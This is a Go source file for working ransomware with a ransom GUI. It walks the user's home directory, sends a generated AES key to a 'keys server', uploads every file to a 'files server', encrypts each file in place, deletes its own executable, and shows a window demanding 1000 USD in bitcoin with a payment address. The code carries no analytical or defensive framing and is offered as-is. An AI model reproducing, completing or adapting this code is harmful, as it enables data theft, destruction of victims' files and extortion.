package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"keys"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

const BUFFERSIZE = 1024

func main() {
	var home_dir string
	home_dir, _ = os.UserHomeDir()
	var allfiles []string = ListAllfiles(home_dir)
	passwd, err := keys.Generate(32, 10, 10, false, false)
	if err != nil {
		panic(err)
	}
	key := []byte(passwd)
	sock, err := net.Dial("tcp", "127.0.0.1:3000") //keys server
	if err != nil {
		panic(err)
	}
	sock.Write(key)
	sock.Close()
	for i := 0; i < len(allfiles); i++ {
		s, err := net.Dial("tcp", "127.0.0.2:3000") //files server
		if err != nil {
			panic(err)
		}
		sendFileToServer(s, allfiles[i])
		s.Close()
	}
	for i := 0; i < len(allfiles); i++ {
		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err)
		}
		plaintext, err := os.ReadFile(allfiles[i])
		if err != nil {
			continue
		}
		ciphertext := make([]byte, aes.BlockSize+len(plaintext))
		iv := ciphertext[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			panic(err)
		}
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
		os.WriteFile(allfiles[i], ciphertext, 0777)
	}
	home_dir, _ = os.Executable()
	os.Remove(home_dir)
	myApp := app.New()
	myWindow := myApp.NewWindow("Please Pay Close attention You Got Hacked !")

	txtBound := binding.NewString()
	txtWid := widget.NewLabelWithData(txtBound)
	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send us 1000 USD to the bitcoin address here and contact us at @...")
	bottomBox := container.NewHBox(
		hello,
		layout.NewSpacer(),
		widget.NewButtonWithIcon("copy bitcoin address", theme.ContentCopyIcon(), func() {
			if content, err := txtBound.Get(); err == nil {
				myWindow.Clipboard().SetContent(content)
			}
			hello.SetText("Don't forget to contact us at @ with your transaction id write this down and Thanks")
		}),
	)

	content := container.NewBorder(nil, bottomBox, nil, nil, txtWid)

	go func() { // make changing content...
		for {
			txtBound.Set("17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR")
		}
	}()
	myWindow.SetContent(content)
	myWindow.ShowAndRun()
}
func ListAllfiles(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			return filepath.SkipDir
		}
		if !info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}
func sendFileToServer(connection net.Conn, filePath string) {
	//A client has connected
	defer connection.Close()
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
		return
	}
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
		return
	}
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	//Sending filename and filesize!
	connection.Write([]byte(fileSize))
	connection.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFERSIZE)
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		connection.Write(sendBuffer)
	}
	return
}
func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}